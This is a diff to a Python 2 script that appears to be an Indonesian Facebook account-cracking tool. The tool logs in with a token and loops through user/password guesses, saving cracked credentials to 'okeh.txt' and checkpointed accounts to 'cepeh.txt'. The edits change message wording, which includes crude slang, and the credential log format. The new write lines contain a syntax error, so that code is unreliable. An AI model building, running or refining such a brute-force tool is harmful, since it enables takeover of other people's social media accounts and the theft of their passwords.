@@ -81,7 +81,7 @@ header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0
 def masuk():
     os.system('clear');banner()
     print ('\n%s[01] Login pakai token \n[02] Cara mendapatkan token \n[%s00%s] Keluar (Ahh Ngecrot)'%(P,M,P))
-    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
+    rom = raw_input('\n%s[?] Menu : %s'%(P,K))
     if rom in(""):
     	print("%s [!] Isi yang benar kentod "%(M));exit()
     elif rom in ('1','01'):
@@ -510,7 +510,7 @@ def crack2(user, pwx):
 		else:
 			if len(status_foll) != 1:
 				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
-				print "\r "+rm+"[Crack][%s/%s][OK:%s][CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
+				print "\r"+rm+"[Crack][%s/%s][OK:%s][CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
 				sys.stdout.flush()
 				c_bff_ -= 1
 			else:
@@ -543,7 +543,7 @@ def crack2(user, pwx):
 					cepeh = "Checkpoint"
 					ingfo(user, pw, cepeh)
 					with open("cepeh.txt", "a") as simpan:
-						simpan.write(" [Checkpoint] "+user+" ◊ "+pw+"\n")
+						simpan.write(" [Checkpoint] nama: "+user+ sandi:" • "+pw+"\n")
 					cp.append(user)
 					break
 				elif "userId" in str(data):
@@ -551,12 +551,12 @@ def crack2(user, pwx):
 					if len(status_foll) != 1:
 						ingfo(user, pw, okeh)
 						with open("okeh.txt", "a")as simpan:
-							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
+							simpan.write(" [Berhasil] nama: "+user+ sandi:" • "+pw+"\n")
 						ok.append(user)
 						#follow(ses,user)
 					break
 				elif "Please wait" in str(data):
-					print ("\r%s[!] Mode pesawatkan 2 detik ngab"%(M)),
+					print ("\r%s[!] Mode pesawatkan 2detik bro"%(M)),
 					looping+=1
 					sys.stdout.flush()
 					pwx = [pw]
@@ -566,7 +566,7 @@ def crack2(user, pwx):
 					looping =1
 					pass
 		except requests.exceptions.ConnectionError:
-			print ("\r%s[!] Tidak ada koneksi internet ngab"%(M)),
+			print ("\r%s[!] Tidak ada koneksi internet bro"%(M)),
 			sys.stdout.flush()
 			looping+=1
 			pwx = [pw]
